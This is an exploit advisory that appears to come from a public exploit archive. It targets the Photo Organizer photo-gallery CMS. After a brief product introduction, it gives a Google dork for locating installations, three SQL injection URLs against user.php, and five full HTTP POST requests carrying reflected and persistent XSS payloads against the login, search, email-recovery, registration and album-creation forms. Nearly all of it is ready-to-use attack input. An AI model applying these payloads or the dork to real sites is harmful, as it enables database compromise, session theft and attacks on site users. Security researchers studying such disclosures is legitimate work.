@@ -1,0 +1,145 @@
+id: 22251
+date: 05/15/2014
+title: Photo Organizer CMS - XSS and SQL Vulnerabilities
+author: DaisukeDan
+cves: 
+
+1=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=1
+0  ____                                   __                  ____                          0
+1 /\  _`\             __                 /\ \                /\  _`\                        1
+0 \ \ \/\ \     __   /\_\    ____  __  __\ \ \/'\      __    \ \ \/\ \     __      ___      0
+1  \ \ \ \ \  /'__`\ \/\ \  /',__\/\ \/\ \\ \ , <    /'__`\   \ \ \ \ \  /'__`\  /' _ `\    1
+0   \ \ \_\ \/\ \L\.\_\ \ \/\__, `\ \ \_\ \\ \ \\`\ /\  __/    \ \ \_\ \/\ \L\.\_/\ \/\ \   0
+1    \ \____/\ \__/.\_\\ \_\/\____/\ \____/ \ \_\ \_\ \____\    \ \____/\ \__/.\_\ \_\ \_\  1
+0     \/___/  \/__/\/_/ \/_/\/___/  \/___/   \/_/\/_/\/____/     \/___/  \/__/\/_/\/_/\/_/  0
++-------------------------------------------------------------------------------------------+
+1 # CyberNinja // Researcher // PenTester //                                                1
+0 # Twitter: @TheHackersBay                                                                 0
+1=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=1
+0 # Exploit Title: Photo Organizer - XSS and SQL Vulnerabilities                            0
+1 # Google Dork: intext:"Powered by Photo Organizer"                                        1
+0 # Date: 10/05/2014                                                                        0
+1 # Exploit Author: Daisuke Dan                                                             1
+0 # Vendor Homepage: http://po.shaftnet.org/                                                0
+1 # Software Link: http://po.shaftnet.org/#download                                         1
+0 # Version: All versions                                                                   0
+1 # Tested on: Windows Seven                                                                1
+0=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=0
+
+0x01# ~ Introduction 
+====================
+At its most basic level, Photo Organizer is (yet another) a multiuser web-based photo gallery engine. It differentiates itself by focusing on asset management, aiming at the needs of professional photographers rather than the more typical “I need to share some images on the web and blog about it” crowd. It does not make the assumption that just because you have an image, you want to share it with someone. It combines “we'd like to show people some photos” with “we have a lot of photos we just store and annotate.”
+To that end, Photo Organizer is highly scalable, capable of handling tens of thousands of images with ease. Coupled with robust importing, exporting, searching, tagging, and printing capabilities, it is intended to act as a photographer's primary image repository. 
+
+0x02# ~ Exploitation
+====================
+
+1=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=1
+0                 [+] Boolean SQL Injection & Blind [+]                 0
+1=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=1
+
+http://site.com/user.php?user=1 and 1=2
+http://site.com/user.php?user=1 union select 1,2--
+http://site.com/user.php?user=-1 OR 17-7=10
+
+1=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=1
+0            [+] Reflected XSS Cross Site Scripting [+]                 0
+1=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=1
+
+Affected path(s):login.php
+                 search.text.general.php
+	         login.php?operation=get_email
+	         register.php
+
+========================== HTTP REQUEST XSS 1 ==============================
+Host site.com
+User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-us
+Accept-Encoding: gzip, deflate
+Referer: http://site.com/login.php
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 113
+POST: operation=login&username='"><img+src=x+onerror=prompt(1337);>&password=&auto_login=on&x=0&y=0
+
+XSS Proof Image: http://i.imgur.com/VmbmuiZ.png
+============================================================================
+
+
+========================== HTTP REQUEST XSS 2 ==============================
+Host: site.com
+User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-us
+Accept-Encoding: gzip, deflate
+Referer: http://site.com/search.text.general.php
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 109
+POST: search_string='"><script>alert('1337')</script>&search_type=&current_user=all&x=0&y=0
+
+XSS Proof Image: http://i.imgur.com/PDcO50Y.png
+============================================================================
+
+
+========================== HTTP REQUEST XSS 3 ==============================
+Host: site.com
+User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-us
+Accept-Encoding: gzip, deflate
+Referer: http://site.com/login.php?operation=get_email
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 91
+POST: operation=send_info&email='"><script>alert('1337')</script>&x=0&y=0
+
+XSS Proof Image: http://i.imgur.com/MFc5unu.png
+============================================================================
+
+
+========================== HTTP REQUEST XSS 4 ==============================
+Host: site.com
+User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-us
+Accept-Encoding: gzip, deflate
+Referer: http://site.com/register.php
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 207
+POST: username='"><img+src=x+onerror=prompt(1337);>&password_1=&password_2=&first_name=&last_name=&email=&url=&phone=&company=&address1=&address2=&city=&zipcode=&state=null&country=null&x=0&y=0
+
+XSS Proof Image: http://i.imgur.com/7T4WZMW.png
+============================================================================
+
+
+1=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=1
+0            [+] Persistent XSS Cross Site Scripting [+]                0
+1=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=1
+
+Affected path(s):album.add.php?parent=
+
+========================== HTTP REQUEST XSS 5 ==============================
+Host: site.com
+User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-us
+Accept-Encoding: gzip, deflate
+Referer: http://site.com/album.add.php?parent=
+Cookie: po_session_id=701cc0e40cd083390368f49206b4ccbd
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 132
+POST: album_caption='"><script>alert('1337')</script>&parent=null&album_access_rights=3&album_description=&x=0&y=0
+
+XSS Proof Image: http://i.imgur.com/TrzBqXJ.png
+============================================================================
+
+
+1=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=1
+0   TheHackersBay.org | @TheHackersBay | daisukedan@cyberservices.com   0
+1=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=1
+
+#  0day.today [2023-03-21]  #
